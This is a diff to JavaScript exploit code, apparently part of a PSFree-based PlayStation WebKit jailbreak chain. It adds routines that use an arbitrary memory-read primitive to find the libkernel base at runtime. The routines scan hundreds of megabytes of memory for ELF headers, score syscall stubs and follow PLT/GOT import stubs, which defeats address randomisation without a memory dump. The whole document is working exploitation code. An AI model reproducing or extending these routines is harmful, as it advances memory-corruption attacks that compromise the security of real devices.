@@ -187,27 +187,69 @@ function lkAligned(lk) {
     return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
 }
 
-/** PSFree find_base — walk back 16KB pages until ELF magic (max N pages). */
+function isSameWebkitModule(base, webkitBase, off) {
+    if (!base || !webkitBase) return false;
+    if (base.hi !== webkitBase.hi) return false;
+    const lo = webkitBase.low >>> 0;
+    const bl = base.low >>> 0;
+    if (bl < lo) return false;
+    return (bl - lo) <= iatCap(off);
+}
+
+/** Sparse syscall stub count — libkernel.sprx / libkernel_web has many mov rax,N patterns. */
+function scoreSyscallStubs(p, base, maxOff, step) {
+    maxOff = maxOff || 0x80000;
+    step = step || 0x200;
+    let stubs = 0;
+    for (let off = 0x1000; off < maxOff; off += step) {
+        const w = read4p(p, base.add32(off));
+        if (w != null && (w & 0xffffff) === 0xc0c748) stubs++;
+    }
+    return stubs;
+}
+
+function looksLikeLibkernelModule(p, base) {
+    if (!base) return false;
+    if (isLibkernelPrologue(p, base)) return true;
+    return scoreSyscallStubs(p, base) >= 8;
+}
+
+function scoreModuleAsLibkernel(p, base) {
+    const prologue = isLibkernelPrologue(p, base);
+    const stubs = scoreSyscallStubs(p, base);
+    const score = stubs + (prologue ? 100 : 0);
+    return { stubs, prologue, score };
+}
+
+function pageAlignDown(addr, align) {
+    return new int64((addr.low >>> 0) & ~(align - 1), addr.hi >>> 0);
+}
+
+/** PSFree find_base — walk back pages until ELF magic (16KB then 4KB pages). */
 function findModuleBaseBackward(p, addr, maxPages) {
     if (!addr || addr.hi < 0x8) return null;
-    let page = new int64((addr.low >>> 0) & ~0x3fff, addr.hi >>> 0);
     const limit = maxPages || 512;
-    for (let i = 0; i < limit; i++) {
-        const magic = read4p(p, page);
-        if (magic === ELF_MAGIC) return page;
-        if (magic == null) break;
-        const prev = page.sub32(0x4000);
-        if (!prev || prev.hi < 0x8) break;
-        page = prev;
+    for (let a = 0; a < 2; a++) {
+        const align = a === 0 ? 0x4000 : 0x1000;
+        let page = pageAlignDown(addr, align);
+        for (let i = 0; i < limit; i++) {
+            const magic = read4p(p, page);
+            if (magic === ELF_MAGIC) return page;
+            if (magic == null) break;
+            const prev = page.sub32(align);
+            if (!prev || prev.hi < 0x8) break;
+            page = prev;
+        }
     }
     return null;
 }
 
-/** PLT stub @ webkit+pltRva is ff 25 — read GOT slot, return target fn ptr. */
+/** PLT stub @ webkit+pltRva — ff 25 or ff 15 → GOT slot → target fn ptr. */
 function resolvePltImportAt(p, webkitBase, pltRva) {
     if (pltRva == null) return null;
     const stub = webkitBase.add32(pltRva);
-    if (read2p(p, stub) !== 0x25ff) return null;
+    const op = read2p(p, stub);
+    if (op !== 0x25ff && op !== 0x15ff) return null;
     const disp = s32(read4p(p, stub.add32(2)));
     if (disp == null) return null;
     return read8p(p, stub.add32(6 + disp));
@@ -223,7 +265,7 @@ function lkFromFnPtr(p, fnPtr, off, iatRva) {
     if (!fnPtr) return null;
 
     const walked = findModuleBaseBackward(p, fnPtr, 512);
-    if (walked && isLibkernelPrologue(p, walked))
+    if (walked && looksLikeLibkernelModule(p, walked))
         return { lk: walked, iatRva, errorFn: fnPtr, via: "elf-walk" };
 
     if (isGetpidStub(fnPtr)) {
@@ -255,8 +297,13 @@ function safeVerifyGotSlot(p, webkitBase, off, rva) {
     let fnPtr = read8p(p, webkitBase.add32(rva));
     if (!fnPtr) return null;
     fnPtr = resolveImportPtr(p, webkitBase, off, fnPtr, 0);
-    if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) return null;
-    return lkFromFnPtr(p, fnPtr, off, rva);
+    if (!fnPtr) return null;
+    if (plausibleExtPtr(fnPtr, webkitBase, off))
+        return lkFromFnPtr(p, fnPtr, off, rva);
+    const walked = findModuleBaseBackward(p, fnPtr, 512);
+    if (walked && looksLikeLibkernelModule(p, walked))
+        return { lk: walked, iatRva: rva, errorFn: fnPtr, via: "got-walk" };
+    return null;
 }
 
 function scanAnchorsInit(sub, anchors, radius, step) {
@@ -724,6 +771,167 @@ export function resolveLibkernelPsfree(p, webkitBase, off, opts) {
     return { ok: false, error: "no low PLT import matched libkernel ELF" };
 }
 
+/**
+ * Dump-free: scan ±512MB for ELF modules, pick highest syscall-stub density.
+ * No static offsets — works without webkit dump or jailbreak.
+ */
+function scanElfModulesChunk(p, webkitBase, off, sub, anchors) {
+    const RADIUS = 0x20000000n;
+    const STEP = 0x4000n;
+    const MIN_SCORE = 8;
+
+    if (!anchors || !anchors.length)
+        return { done: true, lk: null, state: sub, phase: "elf-skip" };
+
+    if (!sub) {
+        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
+        sub.phase = "scan";
+        sub.seen = {};
+        sub.queue = [];
+        sub.qIdx = 0;
+        sub.best = null;
+        sub.pages = 0;
+        sub.modules = 0;
+        return {
+            done: false,
+            state: sub,
+            phase: "elf-start",
+            anchor: 0,
+            from: sub.cursor.toString(16),
+            to: sub.end.toString(16),
+        };
+    }
+
+    if (sub.phase === "scan") {
+        let batch = 0;
+        while (sub.cursor <= sub.end && batch < 48) {
+            const addr = bigToPtr(sub.cursor);
+            if (addr.hi >= 0x8) {
+                sub.pages++;
+                if (read4p(p, addr) === ELF_MAGIC) {
+                    const key = ptrBig(addr).toString(16);
+                    if (!sub.seen[key] && !isSameWebkitModule(addr, webkitBase, off)) {
+                        sub.seen[key] = 1;
+                        sub.queue.push(addr);
+                        sub.modules++;
+                    }
+                }
+            }
+            sub.cursor += sub.step;
+            batch++;
+        }
+
+        if (sub.cursor > sub.end) {
+            if (scanAnchorsAdvance(sub, RADIUS)) {
+                return {
+                    done: false,
+                    state: sub,
+                    phase: "elf-anchor",
+                    anchor: sub.anchorIdx,
+                    modules: sub.modules,
+                };
+            }
+            sub.phase = "score";
+            sub.qIdx = 0;
+            if (!sub.queue.length) {
+                return {
+                    done: true,
+                    lk: null,
+                    state: sub,
+                    phase: "elf-miss",
+                    pages: sub.pages,
+                    modules: 0,
+                };
+            }
+        } else {
+            return {
+                done: false,
+                state: sub,
+                phase: "elf",
+                at: sub.cursor.toString(16),
+                pages: sub.pages,
+                modules: sub.modules,
+                anchor: sub.anchorIdx,
+            };
+        }
+    }
+
+    if (sub.phase === "score") {
+        let batch = 0;
+        while (sub.qIdx < sub.queue.length && batch < 2) {
+            const base = sub.queue[sub.qIdx++];
+            const sc = scoreModuleAsLibkernel(p, base);
+            if (!sub.best || sc.score > sub.best.score)
+                sub.best = { base, stubs: sc.stubs, prologue: sc.prologue, score: sc.score };
+            batch++;
+        }
+
+        if (sub.qIdx < sub.queue.length) {
+            return {
+                done: false,
+                state: sub,
+                phase: "elf-score",
+                scored: sub.qIdx,
+                total: sub.queue.length,
+                best: sub.best,
+            };
+        }
+
+        if (sub.best && sub.best.score >= MIN_SCORE) {
+            saveLibkernelSession(sub.best.base, null);
+            return {
+                done: true,
+                lk: sub.best.base,
+                iatRva: null,
+                source: "elf-hunt",
+                state: sub,
+                phase: "elf-hit",
+                stubs: sub.best.stubs,
+                prologue: sub.best.prologue,
+                pages: sub.pages,
+                modules: sub.modules,
+            };
+        }
+
+        return {
+            done: true,
+            lk: null,
+            state: sub,
+            phase: "elf-miss",
+            pages: sub.pages,
+            modules: sub.modules,
+            bestScore: sub.best ? sub.best.score : 0,
+        };
+    }
+
+    return { done: true, lk: null, state: sub, phase: "elf-miss" };
+}
+
+export function resolveLibkernelElfHunt(p, webkitBase, off, opts) {
+    opts = opts || {};
+    const log = opts.log || (() => {});
+    const anchors = [webkitBase];
+    if (opts.nativeFn) {
+        const nb = ptrBig(opts.nativeFn);
+        const wb = ptrBig(webkitBase);
+        if (nb !== wb) anchors.push(opts.nativeFn);
+    }
+
+    let sub = null;
+    let ticks = 0;
+    while (ticks++ < 50000) {
+        const c = scanElfModulesChunk(p, webkitBase, off, sub, anchors);
+        sub = c.state;
+        if (c.done && c.lk) {
+            log("LK-ELF", "base=" + c.lk + " stubs=" + c.stubs
+                + (c.prologue ? " prologue" : ""));
+            return { ok: true, lk: c.lk, source: c.source };
+        }
+        if (c.done) break;
+    }
+    return { ok: false, error: "no libkernel ELF near webkit" };
+}
+
 /** Chunked scan of low .text for ff 25 PLT stubs → libkernel base. */
 function scanPsfreePltChunk(p, webkitBase, off, state) {
     const TEXT_CAP = 0x200000;
@@ -746,7 +954,8 @@ function scanPsfreePltChunk(p, webkitBase, off, state) {
     let batch = 0;
     while (state.cursor < state.endRva && batch < 512) {
         const rva = state.cursor;
-        if (read2p(p, webkitBase.add32(rva)) === 0x25ff) {
+        if (read2p(p, webkitBase.add32(rva)) === 0x25ff
+            || read2p(p, webkitBase.add32(rva)) === 0x15ff) {
             const key = rva.toString(16);
             if (!state.seen[key]) {
                 state.seen[key] = 1;
@@ -799,13 +1008,13 @@ function scanPsfreePltChunk(p, webkitBase, off, state) {
 }
 
 /**
- * PSFree candidates → PLT scan → GOT brute → prologue hunt → stub hunt.
+ * ELF module hunt → PSFree PLT → GOT → prologue → stub.
  */
 export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
     opts = opts || {};
     if (!state) {
         state = {
-            stage: "psfree",
+            stage: "elf",
             sub: null,
             gotSlots: 0,
             pltRefs: 0,
@@ -822,6 +1031,28 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
             const wb = ptrBig(webkitBase);
             if (nb !== wb) state.anchors.push(opts.nativeFn);
         }
+    }
+
+    if (state.stage === "elf") {
+        const c = scanElfModulesChunk(p, webkitBase, off, state.sub, state.anchors);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ state }, c);
+        }
+        if (c.done) {
+            state.stage = "psfree";
+            state.sub = null;
+            return {
+                done: false,
+                state,
+                phase: "psfree-next",
+                prev: c.phase,
+                pages: c.pages,
+                modules: c.modules,
+                bestScore: c.bestScore,
+            };
+        }
+        return Object.assign({ state }, c);
     }
 
     if (state.stage === "psfree") {
@@ -981,8 +1212,8 @@ export function resolveLibkernel(p, webkitBase, off, opts) {
     if (psf.ok)
         return psf;
 
-    log("LK-BLOCK", "PSFree PLT miss — Scan libkernel or paste base (NOT cal/__error IAT)");
-    return { ok: false, error: "Scan libkernel (PSFree PLT) or paste base in hex box" };
+    log("LK-BLOCK", "fast paths miss — tap Scan libkernel (ELF hunt, no dump needed)");
+    return { ok: false, error: "Scan libkernel (runtime ELF hunt) or paste base" };
 }
 
 /** Validate user-pasted libkernel base (1 read). */
